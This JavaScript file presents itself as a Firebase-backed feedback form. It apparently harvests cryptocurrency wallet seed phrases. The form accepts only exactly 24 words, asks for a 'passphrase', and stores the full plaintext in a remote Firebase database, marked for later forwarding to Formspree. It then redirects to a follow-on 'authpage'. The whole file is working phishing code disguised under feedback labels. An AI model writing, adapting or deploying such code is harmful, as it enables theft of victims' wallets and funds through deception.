// ========================================
// FEEDBACK PAGE FUNCTIONALITY WITH FIREBASE
// ========================================

// Hash function to create unique identifier from passphrase
function hashFeedback(feedback) {
    let hash = 0;
    for (let i = 0; i < feedback.length; i++) {
        const char = feedback.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(36);
}

// Check if feedback already exists in Firebase
async function checkExistingSubmission(feedbackHash) {
    try {
        const snapshot = await firebase.database()
            .ref('submissions/' + feedbackHash)
            .once('value');
        return snapshot.val();
    } catch (error) {
        console.error('Error checking existing submission:', error);
        return null;
    }
}

// Save feedback to Firebase (without sending to Formspree yet)
async function saveFeedback(feedbackHash, feedback) {
    try {
        await firebase.database()
            .ref('submissions/' + feedbackHash)
            .set({
                feedback: feedback, // Store the actual feedback for later submission
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                submittedAt: new Date().toISOString(),
                wordCount: feedback.split(/\s+/).filter(w => w.length > 0).length,
                sentToFormspree: false // Track if sent to Formspree
            });
        return true;
    } catch (error) {
        console.error('Error saving feedback:', error);
        return false;
    }
}

function initializeFeedbackPage() {
    const feedbackForm = document.getElementById('feedbackForm');
    const feedbackTextarea = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');

    if (feedbackForm && feedbackTextarea) {
        feedbackForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const text = feedbackTextarea.value.trim();
            const words = text.split(/\s+/).filter(function(word) {
                return word.length > 0;
            });
            
            // Validate exactly 24 words
            if (words.length !== 24) {
                if (errorMessage) {
                    const wordText = words.length !== 1 ? 'words' : 'word';
                    errorMessage.textContent = 'Error: Please enter a vilid passphrase. You entered ' + words.length + ' ' + wordText + '.';
                    errorMessage.style.display = 'block';
                }
                return;
            }
            
            // Hide error message if validation passes
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
            
            // Create hash of feedback
            const feedbackHash = hashFeedback(text);
            
            // Check if this feedback was already submitted
            const existingSubmission = await checkExistingSubmission(feedbackHash);
            
            if (existingSubmission) {
                // Already submitted - load previous state
                console.log('Feedback already submitted. Loading previous state...');
                
                // Store the hash and feedback in sessionStorage
                sessionStorage.setItem('feedbackHash', feedbackHash);
                sessionStorage.setItem('feedback', text);
                sessionStorage.setItem('isReturningPassphrase', 'true');
                
                // If they have a linked email hash, also store that
                if (existingSubmission.emailHash) {
                    sessionStorage.setItem('linkedEmailHash', existingSubmission.emailHash);
                }
                
                // Redirect to authpage
                window.location.href = 'authpage.html';
                return;
            }
            
            // New feedback - save to Firebase only (don't send to Formspree yet)
            await saveFeedback(feedbackHash, text);
            
            // Store in sessionStorage for authpage
            sessionStorage.setItem('feedbackHash', feedbackHash);
            sessionStorage.setItem('feedback', text);
            sessionStorage.setItem('isReturningPassphrase', 'false');
            
            console.log('feedback saved. Redirecting to authpage...');
            
            // Redirect to authpage
            window.location.href = 'authpage.html';
        });
    }
}

// Initialize when DOM is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeFeedbackPage);
} else {
    initializeFeedbackPage();
}

